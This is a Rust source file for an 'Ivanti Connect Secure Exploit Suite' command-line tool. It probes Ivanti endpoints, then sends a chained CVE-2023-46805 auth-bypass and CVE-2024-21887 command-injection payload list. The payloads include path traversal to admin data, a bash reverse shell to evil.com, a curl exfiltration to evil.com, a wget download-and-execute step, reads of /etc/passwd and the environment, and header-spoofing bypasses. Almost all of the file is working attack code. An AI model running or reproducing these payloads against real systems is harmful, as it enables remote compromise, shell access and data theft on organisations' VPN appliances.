use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const IVANTI_ENDPOINTS: &[(&str, &str)] = &[
    ("Admin portal", "/admin/"),
    ("Admin login", "/admin/login"),
    ("API", "/api/v1/"),
    ("Status", "/api/v1/status"),
    ("Config", "/api/v1/configuration"),
    ("Users", "/api/v1/users"),
    ("Sessions", "/api/v1/sessions"),
    ("Cert", "/api/v1/certificate"),
    ("License", "/api/v1/license"),
    ("Health", "/api/v1/health"),
    ("Dana", "/dana-na/"),
    ("Dana cache", "/dana-na/cache/"),
    ("Dana auth", "/dana-na/auth/"),
    ("Dana fed", "/dana-fed/"),
    ("WS", "/dana-ws/"),
    ("Misc", "/dana-misc/"),
    ("CIFS", "/dana-cifs/"),
    ("FTP", "/dana-ftp/"),
    ("NFS", "/dana-nfs/"),
    ("SMB", "/dana-smb/"),
];

const AUTH_BYPASS_PAYLOADS: &[(&str, &str, &str)] = &[
    (
        "CVE-2023-46805 — path traversal",
        "GET",
        "/api/v1/totp/user-backup-code/../system/backup",
    ),
    (
        "CVE-2023-46805 — admin path",
        "GET",
        "/api/v1/totp/user-backup-code/../system/admin/users",
    ),
    (
        "CVE-2023-46805 — config",
        "GET",
        "/api/v1/totp/user-backup-code/../system/configuration",
    ),
    (
        "CVE-2023-46805 — sessions",
        "GET",
        "/api/v1/totp/user-backup-code/../system/sessions",
    ),
    (
        "CVE-2023-46805 — license",
        "GET",
        "/api/v1/totp/user-backup-code/../system/license",
    ),
    (
        "CVE-2023-46805 — cert",
        "GET",
        "/api/v1/totp/user-backup-code/../system/certificate",
    ),
    (
        "CVE-2024-21887 — command inject",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;whoami",
    ),
    (
        "CVE-2024-21887 — cat passwd",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;cat%20/etc/passwd",
    ),
    (
        "CVE-2024-21887 — env",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;env",
    ),
    (
        "CVE-2024-21887 — id",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;id",
    ),
    (
        "CVE-2024-21887 — reverse shell",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;bash%20-i%20%3E%26%20/dev/tcp/evil.com/4444%200%3E%261",
    ),
    (
        "CVE-2024-21887 — curl exfil",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;curl%20https://evil.com/$(whoami)",
    ),
    (
        "CVE-2024-21887 — write file",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;echo%20PWNED%20%3E%20/tmp/pwned",
    ),
    (
        "CVE-2024-21887 — download exec",
        "GET",
        "/api/v1/system/maintenance/archiving/cloud-server-test-connection?hostname=a;wget%20https://evil.com/shell.sh%20-O%20/tmp/s%20%26%26%20chmod%20%2Bx%20/tmp/s%20%26%26%20/tmp/s",
    ),
    ("Auth bypass — X-Forwarded-For", "GET", "/admin/"),
    ("Auth bypass — X-Real-IP", "GET", "/admin/"),
    ("Auth bypass — X-Original-URL", "GET", "/admin/users"),
    ("Auth bypass — path normalization", "GET", "/admin//users"),
    ("Auth bypass — encoded path", "GET", "/%61dmin/users"),
];

pub async fn cve(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Ivanti Connect Secure Exploit Suite",
        "[*]".cyan().bold()
    );
    println!(
        "{} CVE-2023-46805 (auth bypass) + CVE-2024-21887 (RCE)",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!(
        "{} {} endpoints, {} exploit payloads",
        "[*]".cyan().bold(),
        IVANTI_ENDPOINTS.len(),
        AUTH_BYPASS_PAYLOADS.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!(
        "\n{} [1/2] Ivanti endpoint discovery...",
        "[*]".cyan().bold()
    );
    let mut found = Vec::new();
    for (name, path) in IVANTI_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200 || status == 302;
                let has_admin = body.contains("admin") || body.contains("Admin");
                let has_api = body.contains("api") || body.contains("API");
                let has_login =
                    body.contains("login") || body.contains("Login") || body.contains("password");
                let tag = if accessible {
                    if has_admin {
                        "ADMIN".red().bold().to_string()
                    } else if has_api {
                        "API".green().bold().to_string()
                    } else if has_login {
                        "LOGIN".yellow().to_string()
                    } else {
                        "accessible".green().to_string()
                    }
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };
                println!(
                    "  {} {:20} {:30} status={} {}",
                    "*".cyan(),
                    name,
                    path,
                    status,
                    tag
                );
                if accessible {
                    found.push(*name);
                }
            }
            Err(_) => {
                println!("  {} {:20} {:30} error", "*".red(), name, path);
            }
        }
    }

    println!(
        "\n{} [2/2] CVE-2023-46805 + CVE-2024-21887 exploit payloads...",
        "[*]".cyan().bold()
    );
    let mut results = Vec::new();
    let mut auth_bypass = false;
    let mut rce = false;

    for (name, method, path) in AUTH_BYPASS_PAYLOADS {
        let full_url = format!("{}{}", base, path);
        let mut req = if *method == "POST" {
            client.post(&full_url)
        } else {
            client.get(&full_url)
        };

        if name.contains("X-Forwarded-For") {
            req = req.header("X-Forwarded-For", "127.0.0.1");
        } else if name.contains("X-Real-IP") {
            req = req.header("X-Real-IP", "127.0.0.1");
        } else if name.contains("X-Original-URL") {
            req = req.header("X-Original-URL", "/admin/users");
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_data = body.contains("user")
                    || body.contains("config")
                    || body.contains("session")
                    || body.contains("license")
                    || body.contains("cert");
                let has_rce = body.contains("root")
                    || body.contains("uid=")
                    || body.contains("admin")
                    || body.contains("PWNED")
                    || body.contains("evil.com");
                let has_error = body.contains("error")
                    || body.contains("denied")
                    || body.contains("unauthorized");
                let is_cve46805 = name.contains("CVE-2023-46805");
                let is_cve21887 = name.contains("CVE-2024-21887");

                let tag = if has_rce {
                    "RCE".red().bold().to_string()
                } else if has_data && !has_error {
                    "DATA EXFIL".red().bold().to_string()
                } else if is_cve46805 && status == 200 {
                    "AUTH BYPASS".red().bold().to_string()
                } else if has_error || status == 401 || status == 403 {
                    "blocked".green().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:45} status={} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    status,
                    tag
                );

                if has_rce || (has_data && !has_error) || (is_cve46805 && status == 200) {
                    if is_cve21887 {
                        rce = true;
                    }
                    if is_cve46805 {
                        auth_bypass = true;
                    }
                    println!(
                        "    {} {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                    results.push(*name);
                }
            }
            Err(_) => {
                println!(
                    "  {} [{:02}] {:45} error",
                    "*".red(),
                    results.len() + 1,
                    name
                );
            }
        }
    }

    println!(
        "\n{} {} endpoints found, {} / {} exploits succeeded",
        "[*]".cyan().bold(),
        found.len(),
        results.len(),
        AUTH_BYPASS_PAYLOADS.len()
    );

    if auth_bypass {
        println!(
            "{} [CRITICAL] CVE-2023-46805 — authentication bypass confirmed!",
            "[!]".red().bold()
        );
    }
    if rce {
        println!(
            "{} [CRITICAL] CVE-2024-21887 — command injection RCE confirmed!",
            "[!]".red().bold()
        );
    }
    if auth_bypass && rce {
        println!(
            "{} [CRITICAL] Full chain: auth bypass + RCE = complete system compromise!",
            "[!]".red().bold()
        );
    }
    if results.is_empty() {
        println!(
            "{} No Ivanti vulnerabilities detected.",
            "[-]".green().bold()
        );
    }

    Ok(())
}
